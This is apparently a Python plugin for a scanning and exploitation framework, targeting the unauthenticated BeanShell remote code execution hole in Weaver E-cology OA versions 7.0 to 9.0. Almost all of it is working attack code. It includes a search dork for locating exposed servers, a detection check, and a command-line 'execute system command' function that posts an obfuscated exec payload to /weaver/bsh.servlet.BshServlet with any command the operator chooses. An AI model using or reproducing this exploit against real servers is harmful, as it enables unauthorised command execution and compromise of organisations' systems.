# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "泛微OA E-cology未授权远程代码执行漏洞",
        "dork": "app=\"泛微-协同办公OA\"",
        "version": "E-cology 7.0,E-cology 8.0,E-cology 8.1,E-cology 9.0",
        "description": "该漏洞存在于泛微协同管理应用平台OA系统的BeanShell组件中，该组件为系统自带且允许未授权访问。攻击者通过调用BeanShell组件的问题接口可直接在目标服务器上执行任意命令。",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        res = self.exec_cmd(self.target.value, f'echo {random_str}')
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './weaver/bsh.servlet.BshServlet'),
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            },
            data=f"bsh.script=\\u0065\\u0078\\u0065\\u0063(\"{cmd}\");&bsh.servlet.output=raw",
            timeout=15
        )
        if r.status_code == 200 and ";</script>" not in r.text and "Login.jsp" not in r.text and "Error" not in r.text:
            return r.text
